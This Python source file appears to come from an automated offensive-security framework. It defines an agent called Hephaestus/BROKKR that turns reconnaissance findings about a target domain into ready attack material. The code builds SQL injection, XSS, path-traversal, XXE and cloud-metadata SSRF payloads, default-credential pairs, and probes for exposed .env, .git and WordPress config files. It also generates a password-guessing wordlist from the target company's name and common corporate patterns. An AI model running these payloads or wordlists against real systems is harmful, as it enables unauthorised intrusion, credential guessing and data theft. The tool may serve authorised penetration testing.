import os
import json
from datetime import datetime
from core.config import settings
from .base import BaseAgent


class Hephaestus(BaseAgent):
    name = "hephaestus"
    symbol = "BR"
    display_name = "BROKKR"
    role = "Payload Forge & Exploit Preparation"

    async def execute(self, target: str, context: dict = None) -> dict:
        hermes = (context or {}).get("hermes", {})
        ares = (context or {}).get("ares", {})
        athena = (context or {}).get("athena", {})

        await self.log("Analyzing findings to prepare targeted payloads", "info")

        result = {
            "payloads_generated": [],
            "wordlists_created": [],
            "exploitable_targets": [],
            "forge_report": {},
            "candidate_targets": [],
        }

        vulns = ares.get("vulnerabilities", [])
        offensive = ares.get("offensive", {}) if isinstance(ares, dict) else {}
        offensive_candidates = []
        for _key in ("sqli", "xss", "dast", "auth", "dependency", "scope_candidates", "path_traversal", "idor_bola"):
            offensive_candidates.extend(offensive.get(_key, []) or [])
        live_hosts = hermes.get("live_hosts", [])
        technologies = hermes.get("technologies", {})
        vendors = hermes.get("vendors", [])
        domain = hermes.get("domain", target)

        await self.log(
            f"Building payload set from {len(vulns)} template findings + "
            f"{len(offensive_candidates)} offensive candidates + {len(technologies)} tech fingerprints",
            "info",
        )

        # Custom wordlist based on target context
        wordlist = await self._build_wordlist(domain, vendors, technologies, athena)
        if wordlist:
            wl_path = os.path.join(settings.reports_dir, f"wordlist_{domain.replace('.', '_')}.txt")
            try:
                os.makedirs(settings.reports_dir, exist_ok=True)
                with open(wl_path, "w") as f:
                    f.write("\n".join(wordlist))
                result["wordlists_created"].append({"path": wl_path, "entries": len(wordlist)})
                await self.log(f"Custom wordlist: {len(wordlist)} entries written to {wl_path}", "success")
            except Exception as e:
                await self.log(f"Wordlist write failed: {e}", "warn")

        # Payload sets for identified vulnerability classes
        for vuln in vulns:
            sev = vuln.get("severity", "info")
            template = vuln.get("template", "")
            matched_at = vuln.get("matched_at", "")

            if sev in ("critical", "high") and matched_at:
                payloads = self._payloads_for_template(template, matched_at)
                if payloads:
                    result["payloads_generated"].extend(payloads)
                    result["exploitable_targets"].append(matched_at)

        seen_candidates = set()
        for candidate in offensive_candidates[:40]:
            url = self._candidate_url(candidate)
            if url:
                if url not in seen_candidates:
                    seen_candidates.add(url)
                    result["candidate_targets"].append(url)
                result["payloads_generated"].extend(self._payloads_for_offensive_candidate(candidate, url))
                if self._is_confirmed_exploitable_candidate(candidate) and url not in result["exploitable_targets"]:
                    result["exploitable_targets"].append(url)

        external_param_candidates = offensive.get("external_params", [])[:40] if isinstance(offensive, dict) else []
        for candidate in external_param_candidates:
            url = self._candidate_url(candidate)
            if url and url not in seen_candidates:
                seen_candidates.add(url)
                result["candidate_targets"].append(url)

        # Generic web payload sets based on tech stack
        web_payloads = self._generic_web_payloads(technologies)
        result["payloads_generated"].extend(web_payloads)

        # Save forge report
        result["forge_report"] = {
            "domain": domain,
            "total_payloads": len(result["payloads_generated"]),
            "exploitable_count": len(result["exploitable_targets"]),
            "candidate_count": len(result["candidate_targets"]),
            "wordlist_entries": sum(w["entries"] for w in result["wordlists_created"]),
            "timestamp": datetime.utcnow().isoformat(),
        }

        await self.log(
            f"Forge complete: {len(result['payloads_generated'])} payloads | "
            f"{len(result['exploitable_targets'])} confirmed exploitable | "
            f"{len(result['candidate_targets'])} candidate targets",
            "success",
        )
        return result

    def _candidate_url(self, candidate: dict) -> str:
        if not isinstance(candidate, dict):
            return ""
        url = (
            candidate.get("url")
            or candidate.get("matched_at")
            or candidate.get("target")
            or candidate.get("route")
            or candidate.get("poc")
            or ""
        )
        if isinstance(url, str) and url.startswith("http"):
            return url
        return ""

    def _candidate_text(self, candidate: dict) -> str:
        if not isinstance(candidate, dict):
            return ""
        fields = [
            candidate.get("title"),
            candidate.get("type"),
            candidate.get("category"),
            candidate.get("template"),
            candidate.get("parameter"),
            candidate.get("param"),
            candidate.get("signal"),
            candidate.get("description"),
            candidate.get("evidence"),
        ]
        return " ".join(str(x) for x in fields if x).lower()

    def _is_confirmed_exploitable_candidate(self, candidate: dict) -> bool:
        text = self._candidate_text(candidate)
        severity = str(candidate.get("severity") or "").lower() if isinstance(candidate, dict) else ""
        if severity in ("critical", "high") and "candidate" not in text and "possible" not in text:
            return True
        return any(marker in text for marker in ("confirmed", "sql injection", "cross-site scripting", "path traversal"))

    def _payloads_for_offensive_candidate(self, candidate: dict, url: str) -> list:
        text = self._candidate_text(candidate)
        param = candidate.get("parameter") or candidate.get("param") or ""
        payloads = []

        if "sql" in text or "sqli" in text:
            payloads.extend([
                {"type": "SQLi", "payload": "' OR '1'='1", "target": url, "parameter": param},
                {"type": "SQLi", "payload": "' OR 1=1--", "target": url, "parameter": param},
                {"type": "SQLi", "payload": "1' AND SLEEP(5)--", "target": url, "parameter": param},
            ])
        if "xss" in text or "cross-site" in text or "reflection" in text:
            payloads.extend([
                {"type": "XSS", "payload": "<script>alert(1)</script>", "target": url, "parameter": param},
                {"type": "XSS", "payload": "<img src=x onerror=alert(document.domain)>", "target": url, "parameter": param},
            ])
        if "path traversal" in text or "lfi" in text or "file" in text:
            payloads.extend([
                {"type": "LFI", "payload": "../../../etc/passwd", "target": url, "parameter": param},
                {"type": "LFI", "payload": "....//....//....//etc/passwd", "target": url, "parameter": param},
            ])
        if "xxe" in text or "xml external" in text:
            payloads.append({
                "type": "XXE",
                "payload": "<!DOCTYPE x [<!ENTITY ygg SYSTEM \"file:///etc/hostname\">]><x>&ygg;</x>",
                "target": url,
                "parameter": param,
            })
        if "redirect" in text or "link manipulation" in text:
            payloads.append({"type": "Redirect", "payload": "https://example.com/", "target": url, "parameter": param})
        if "idor" in text or "bola" in text:
            payloads.append({"type": "IDOR/BOLA", "payload": "neighbor-object-id", "target": url, "parameter": param})

        return payloads

    async def _build_wordlist(self, domain: str, vendors: list, technologies: dict, athena: dict) -> list:
        words = set()

        # Domain-derived
        parts = domain.split(".")
        for p in parts:
            if len(p) > 2:
                words.add(p)
                words.add(p.lower())
                words.add(p.capitalize())
                words.add(p + "123")
                words.add(p + "2024")
                words.add(p + "2025")
                words.add(p + "!")

        # Company name mutations
        company = parts[0] if parts else domain
        mutations = [
            company, company.lower(), company.upper(), company.capitalize(),
            company + "@123", company + "123!", company + "2024!", company + "@2025",
            company + "_admin", company + "_dev", "admin_" + company,
            company[:4] + "2024", company[:4] + "!", "P@ss" + company,
        ]
        words.update(mutations)

        # Vendor-based (KnowBe4 + weak password training paradox)
        vendor_names = [v["vendor"].split()[0].lower() for v in vendors]
        for v in vendor_names:
            words.add(v + "2024!")
            words.add(v + "@123")

        # Tech-specific paths / admin defaults
        all_techs = []
        for tech_list in technologies.values():
            all_techs.extend(tech_list)

        if any("WordPress" in t for t in all_techs):
            words.update(["admin", "password", "wordpress", "wp-admin", "admin123", "letmein"])
        if any("Drupal" in t for t in all_techs):
            words.update(["drupal", "admin", "password1", "admin@drupal"])
        if any("nginx" in t.lower() for t in all_techs):
            words.update(["nginx", "webmaster"])

        # Common corporate password patterns
        words.update([
            "Password1", "Password1!", "Welcome1", "Welcome1!",
            "Summer2024!", "Winter2024!", "Spring2025!", "Fall2024!",
            "January@1", "Admin@123", "Letmein1!", "Changeme1",
            "Qwerty123!", "Company1!", "123456Aa!",
        ])

        return sorted(list(words))

    def _payloads_for_template(self, template: str, url: str) -> list:
        payloads = []
        tl = template.lower()

        if "sqli" in tl or "sql-injection" in tl:
            payloads = [
                {"type": "SQLi", "payload": "' OR '1'='1", "target": url},
                {"type": "SQLi", "payload": "' OR 1=1--", "target": url},
                {"type": "SQLi", "payload": "admin'--", "target": url},
                {"type": "SQLi", "payload": "1' AND SLEEP(5)--", "target": url},
            ]
        elif "xss" in tl:
            payloads = [
                {"type": "XSS", "payload": "<script>alert(1)</script>", "target": url},
                {"type": "XSS", "payload": "<img src=x onerror=alert(document.domain)>", "target": url},
                {"type": "XSS", "payload": "javascript:alert(1)", "target": url},
            ]
        elif "ssrf" in tl:
            payloads = [
                {"type": "SSRF", "payload": "http://169.254.169.254/latest/meta-data/", "target": url},
                {"type": "SSRF", "payload": "http://localhost:8080/", "target": url},
            ]
        elif "lfi" in tl or "path-traversal" in tl:
            payloads = [
                {"type": "LFI", "payload": "../../../etc/passwd", "target": url},
                {"type": "LFI", "payload": "....//....//....//etc/passwd", "target": url},
            ]
        elif "default-login" in tl or "default-creds" in tl:
            payloads = [
                {"type": "DefaultCreds", "payload": "admin:admin", "target": url},
                {"type": "DefaultCreds", "payload": "admin:password", "target": url},
                {"type": "DefaultCreds", "payload": "admin:123456", "target": url},
            ]

        return payloads

    def _generic_web_payloads(self, technologies: dict) -> list:
        all_techs = []
        for tech_list in technologies.values():
            all_techs.extend([t.lower() for t in tech_list])

        payloads = []

        # Universal recon payloads
        payloads.extend([
            {"type": "Recon", "payload": "/../../../etc/passwd", "note": "Path traversal"},
            {"type": "Recon", "payload": "/.git/HEAD", "note": "Git exposure"},
            {"type": "Recon", "payload": "/.env", "note": "Environment file"},
            {"type": "Recon", "payload": "/robots.txt", "note": "Robots disclosure"},
            {"type": "Recon", "payload": "/sitemap.xml", "note": "Sitemap enum"},
        ])

        if any("php" in t for t in all_techs):
            payloads.extend([
                {"type": "PHP", "payload": "<?php phpinfo(); ?>", "note": "PHP info probe"},
                {"type": "PHP", "payload": "/?page=../../../../etc/passwd", "note": "PHP LFI"},
            ])

        if any("wordpress" in t for t in all_techs):
            payloads.extend([
                {"type": "WordPress", "payload": "/wp-json/wp/v2/users", "note": "User enum via API"},
                {"type": "WordPress", "payload": "/wp-content/debug.log", "note": "Debug log"},
                {"type": "WordPress", "payload": "/wp-config.php.bak", "note": "Config backup"},
            ])

        return payloads
